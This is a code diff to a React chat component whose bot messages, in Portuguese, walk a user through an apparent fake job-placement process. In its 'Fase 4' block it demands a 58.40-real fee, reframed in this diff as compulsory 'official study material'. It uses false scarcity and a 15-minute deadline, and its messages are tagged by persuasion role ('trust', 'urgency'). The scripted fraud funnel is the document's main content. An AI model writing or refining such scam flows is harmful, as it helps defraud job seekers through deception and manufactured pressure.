@@ -310,10 +310,11 @@ export default function Chat() {
     if (optionId === 'data-ok') {
       await new Promise(resolve => setTimeout(resolve, 600));
 
-      // Fase 4: A Taxa e a Urgência
-      await addTypingMessage('Para que sua vaga seja liberada e sua documentação seja emitida hoje, o sistema solicita o pagamento da taxa de processamento no valor de 58,40 reais.', 300, 'warning');
-      await addTypingMessage('Esta taxa é necessária para organizar o treinamento e garantir seu local de trabalho.', 200, 'trust');
-      await addTypingMessage('Como temos muitas interessadas para a mesma escola, sua reserva será mantida por apenas 15 minutos. Após esse tempo, o sistema passa a vaga para a próxima pessoa da lista.', 200, 'urgency');
+  // Fase 4: Material de Estudos e Taxa
+  await addTypingMessage('Para que sua vaga seja liberada e sua documentação seja emitida hoje, é obrigatório adquirir o material de estudo oficial do programa.', 300, 'warning');
+  await addTypingMessage('O material de estudos é fundamental para sua preparação e faz parte do processo de inscrição.', 200, 'trust');
+  await addTypingMessage('A taxa de 58,40 reais garante seu material de estudo e sua vaga. Só com o material oficial sua inscrição será confirmada.', 200, 'trust');
+  await addTypingMessage('Como temos muitas interessadas para a mesma escola, sua reserva será mantida por apenas 15 minutos. Após esse tempo, o sistema passa a vaga para a próxima pessoa da lista.', 200, 'urgency');
 
       await new Promise<void>(resolve => {
         setTimeout(() => {
